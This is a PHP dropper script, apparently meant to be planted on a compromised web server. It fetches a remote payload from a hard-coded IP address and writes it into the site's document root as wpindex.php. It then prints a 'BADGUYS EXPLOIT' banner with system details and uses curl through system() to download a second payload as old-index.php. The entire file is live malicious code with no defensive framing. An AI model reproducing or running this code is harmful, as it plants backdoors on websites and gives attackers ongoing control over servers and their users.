<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wpindex.php" ;
$text = http_get('http://185.153.180.177/larva');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/public/wpindex.php" ;
$text1 = http_get('http://185.153.180.177/larva');
$open1 = fopen($check1, 'w');
fwrite($open, $text1);
fclose($open);
if(file_exists($check1)){
}
echo '<center><h1>BADGUYS EXPLOIT</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] '; system('curl -s -k 185.153.180.177/load -o old-index.php;');